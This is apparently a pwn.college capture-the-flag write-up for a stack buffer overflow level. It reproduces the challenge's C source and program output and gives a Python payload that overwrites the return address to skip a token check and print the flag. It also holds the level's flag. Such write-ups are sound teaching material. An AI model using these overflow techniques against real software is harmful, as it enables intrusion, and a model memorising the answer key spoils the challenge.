# Binary Exploitation

## Tricky Hijack Control (easy)
```
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from getting the flag!
```

### Solve :

**Flag:** `pwn.college{ofj3Y5Yr652eYaDflX2kXYlmojz.dlTOywSO5EzNzEzW}`

Reading the .c file gave me
```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 504; nop; .endr");
}

void win_authed(int token)
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    if (token != 0x1337) return;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[19];
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 19);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is no \"win\" variable.\n");
    printf("You will need to force the program to execute the win_authed() function\n");
    printf("by directly overflowing into the stored return address back to main,\n");
    printf("which is stored at %p, %d bytes after the start of your input buffer.\n", rp_, rp_ - (unsigned long) &data.input);
    printf("That means that you will need to input at least %d bytes (%d to fill the buffer,\n", rp_ + 8 - (unsigned long) &data.input, 19);
    printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (unsigned long) &data.input - 19);
    printf("and 8 that will overwrite the return address).\n\n");

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the canary is disabled, otherwise you would corrupt it before");
    puts("overwriting the return address, and the program would abort.");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 19);

    printf("Of these, you will overwrite %d bytes into the return address.\n", (long)((unsigned long) &data.input + size - rp_));
    printf("If that number is greater than 8, you will overwrite the entire return address.\n\n");

    puts("One caveat in this challenge is that the win_authed() function must first auth:");
    puts("it only lets you win if you provide it with the argument 0x1337.");
    puts("Speifically, the win_authed() function looks something like:");
    puts("    void win_authed(int token)");
    puts("    {");
    puts("      if (token != 0x1337) return;");
    puts("      puts(\"You win! Here is your flag: \");");
    puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
    puts("      puts(\"\");");
    puts("    }");
    puts("");

    printf("So how do you pass the check? There *is* a way, and we will cover it later,\n");
    printf("but for now, we will simply bypass it! You can overwrite the return address\n");
    printf("with *any* value (as long as it points to executable code), not just the start\n");
    printf("of functions. Let's overwrite past the token check in win!\n\n");

    printf("To do this, we will need to analyze the program with objdump, identify where\n");
    printf("the check is in the win_authed() function, find the address right after the check,\n");
    printf("and write that address over the saved return address.\n\n");

    printf("Go ahead and find this address now. When you're ready, input a buffer overflow\n");
    printf("that will overwrite the saved return address (at %p, %d bytes into the buffer)\n", rp_, rp_ - (unsigned long)&data.input);
    printf("with the correct value.\n\n");

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the address of win_authed() is %p.\n", win_authed);
    printf("\n");

    printf("If you have managed to overwrite the return address with the correct value,\n");
    printf("challenge() will jump straight to win_authed() when it returns.\n");
    printf("Let's try it now!\n\n", 0);

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```
Running the binary gave me
```
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd57f1a820 (rsp+0x0000) | a0 04 4b 1c 49 7c 00 00 | 0x00007c491c4b04a0 |
| 0x00007ffd57f1a828 (rsp+0x0008) | 98 b9 f1 57 fd 7f 00 00 | 0x00007ffd57f1b998 |
| 0x00007ffd57f1a830 (rsp+0x0010) | 88 b9 f1 57 fd 7f 00 00 | 0x00007ffd57f1b988 |
| 0x00007ffd57f1a838 (rsp+0x0018) | e5 bd 34 1c 01 00 00 00 | 0x000000011c34bde5 |
| 0x00007ffd57f1a840 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd57f1a848 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd57f1a850 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd57f1a858 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffd57f1a860 (rsp+0x0040) | 90 b8 f1 57 fd 7f 00 00 | 0x00007ffd57f1b890 |
| 0x00007ffd57f1a868 (rsp+0x0048) | b8 1d 40 00 00 00 00 00 | 0x0000000000401db8 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffd57f1a820, and our base pointer points to 0x7ffd57f1a860.
This means that we have (decimal) 10 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 80 bytes.
The input buffer begins at 0x7ffd57f1a840, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 19 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffd57f1a868, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (19 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffd57f1a840 (the start of the input buffer)
right up to (but not including) 0x7ffd57f1b840 (which is 4077 bytes beyond the end of the buffer).
Of these, you will overwrite 4056 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffd57f1a868, 40 bytes into the buffer)
with the correct value.

Send your payload (up to 4096 bytes)!
```
Based on this, i figured out that i had to overrwrite the return address of `challenge()` with that of `win_authed()`, after the token check.
- input buffer `0x7ffd57f1a840`
- saved return address `0x7ffd57f1a868`
- offset is 40 bytes
- total bytes to overwrite is 48

Decompiling in ghidra, i got the return address of win_authed() as `0x401698`, i.e. `\x98\x16\x40\x00\x00\x00\x00\x00` in little endian.

So i used the payload
```python
import sys
sys.stdout.buffer.write(b'A'*40 + b'\x98\x16\x40\x00\x00\x00\x00\x00')
```

Running this gave me the flag
```
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x98\x16\x40\x00\x00\x00\x00\x00')" | ./binary-exploitation-control-hijack-2-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc7c8536a0 (rsp+0x0000) | a0 04 b8 3e ef 7f 00 00 | 0x00007fef3eb804a0 |
| 0x00007ffc7c8536a8 (rsp+0x0008) | 18 48 85 7c fc 7f 00 00 | 0x00007ffc7c854818 |
| 0x00007ffc7c8536b0 (rsp+0x0010) | 08 48 85 7c fc 7f 00 00 | 0x00007ffc7c854808 |
| 0x00007ffc7c8536b8 (rsp+0x0018) | e5 bd a1 3e 01 00 00 00 | 0x000000013ea1bde5 |
| 0x00007ffc7c8536c0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc7c8536c8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc7c8536d0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc7c8536d8 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc7c8536e0 (rsp+0x0040) | 10 47 85 7c fc 7f 00 00 | 0x00007ffc7c854710 |
| 0x00007ffc7c8536e8 (rsp+0x0048) | b8 1d 40 00 00 00 00 00 | 0x0000000000401db8 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc7c8536a0, and our base pointer points to 0x7ffc7c8536e0.
This means that we have (decimal) 10 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 80 bytes.
The input buffer begins at 0x7ffc7c8536c0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 19 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc7c8536e8, 40 bytes after the start of your input buffer.
That means that you will need to input at least 48 bytes (19 to fill the buffer,
21 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffc7c8536c0 (the start of the input buffer)
right up to (but not including) 0x7ffc7c8546c0 (which is 4077 bytes beyond the end of the buffer).
Of these, you will overwrite 4056 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }

So how do you pass the check? There *is* a way, and we will cover it later,
but for now, we will simply bypass it! You can overwrite the return address
with *any* value (as long as it points to executable code), not just the start
of functions. Let's overwrite past the token check in win!

To do this, we will need to analyze the program with objdump, identify where
the check is in the win_authed() function, find the address right after the check,
and write that address over the saved return address.

Go ahead and find this address now. When you're ready, input a buffer overflow
that will overwrite the saved return address (at 0x7ffc7c8536e8, 40 bytes into the buffer)
with the correct value.

Send your payload (up to 4096 bytes)!
You sent 48 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc7c8536a0 (rsp+0x0000) | a0 04 b8 3e ef 7f 00 00 | 0x00007fef3eb804a0 |
| 0x00007ffc7c8536a8 (rsp+0x0008) | 18 48 85 7c fc 7f 00 00 | 0x00007ffc7c854818 |
| 0x00007ffc7c8536b0 (rsp+0x0010) | 08 48 85 7c fc 7f 00 00 | 0x00007ffc7c854808 |
| 0x00007ffc7c8536b8 (rsp+0x0018) | e5 bd a1 3e 01 00 00 00 | 0x000000013ea1bde5 |
| 0x00007ffc7c8536c0 (rsp+0x0020) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc7c8536c8 (rsp+0x0028) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc7c8536d0 (rsp+0x0030) | 41 41 41 41 30 00 00 00 | 0x0000003041414141 |
| 0x00007ffc7c8536d8 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc7c8536e0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc7c8536e8 (rsp+0x0048) | 98 16 40 00 00 00 00 00 | 0x0000000000401698 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffc7c8536c0
- the saved frame pointer (of main) is at 0x7ffc7c8536e0
- the saved return address (previously to main) is at 0x7ffc7c8536e8
- the saved return address is now pointing to 0x401698.
- the address of win_authed() is 0x40167c.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{ofj3Y5Yr652eYaDflX2kXYlmojz.dlTOywSO5EzNzEzW}


Bus error
hacker@binary-exploitation~tricky-control-hijack-easy:/challenge$
```
